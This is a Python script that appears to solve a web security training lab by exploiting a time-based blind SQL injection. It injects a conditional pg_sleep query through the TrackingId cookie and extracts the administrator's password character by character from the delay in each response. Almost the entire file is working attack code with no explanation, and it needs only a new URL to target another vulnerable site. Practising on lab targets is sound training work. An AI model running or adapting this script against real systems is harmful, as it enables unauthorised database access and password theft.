import sys
import time
import urllib

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def payloadattk():
    # Replace with the target URL
    url = "https://0a1600b703a11ee281508045005b0094.web-security-academy.net/"

    proxies = {'http': 'http://127.0.0.1:8080',
               'https': 'http://127.0.0.1:8080'}

    passwd = ""
    for x in range(1, 21):
        for y in range(32, 126):
            payload = f"'; SELECT CASE WHEN (username = 'administrator' AND SUBSTRING(password,{x},1)='{chr(y)}') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users--"
            payload_encoded = urllib.parse.quote(payload)
            cookies = {'TrackingId': 'x' + payload_encoded,
                       'session': '7CnJXBMQd55OtU3cpmqYCBuadge1jARX'}
            sys.stdout.write('\r' + passwd + chr(y))
            start_time = time.time()
            requests.get(url, cookies=cookies,
                         verify=False, proxies=proxies)
            end_time = time.time()

            response_time = end_time - start_time

            if (response_time > 4):
                passwd += chr(y)
                break


if __name__ == "__main__":
    payloadattk()
